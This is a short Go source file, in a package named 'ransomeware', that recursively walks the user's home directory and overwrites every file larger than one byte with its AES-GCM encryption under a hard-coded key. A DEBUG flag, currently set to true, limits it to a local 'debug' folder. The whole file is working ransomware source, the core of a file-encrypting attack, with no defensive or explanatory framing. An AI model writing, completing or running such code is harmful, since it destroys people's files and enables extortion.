package ransomeware

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
)

const key string = "abcdefghijklmnopqrstuvwxyz123456"

func GetAllFiles() {
	DEBUG := true
	homeDir, err := os.UserHomeDir()
	if err != nil {
		log.Fatal(err)
	}
	if DEBUG {
		homeDir, err = os.Getwd()
		if err != nil {
			log.Fatal(err)
		}
		homeDir = filepath.Join(homeDir, "/debug/")
	}
	fmt.Println(homeDir)
	var files []string
	err = filepath.Walk(homeDir, func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() && info.Size() > 1 {
			files = append(files, path)
			fmt.Println(path)
			fmt.Println("----------------------------------------------------------------")
			EncryptFile(path)
			fmt.Println("----------------------------------------------------------------")

		}
		return nil
	})
	if err != nil {
		log.Fatal(err)
	}
	for _, file := range files {
		fmt.Println(file)
	}
	//return files, err

}

func EncryptFile(filepath string) {
	data, err := os.ReadFile(filepath)
	if err != nil {
		log.Fatal("Error while reading file " + err.Error())
		return
	}
	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		log.Fatal("Error while creating new cipher " + err.Error())
		return
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatal("Error while creating new GCM " + err.Error())
		return
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		log.Fatal(err)
		return
	}

	cipherText := gcm.Seal(nonce, nonce, data, nil)

	fmt.Println(cipherText)

	err = os.WriteFile(filepath, cipherText, 0777)
	if err != nil {
		log.Fatal("Error while writing data to file " + err.Error())
		return
	}
}
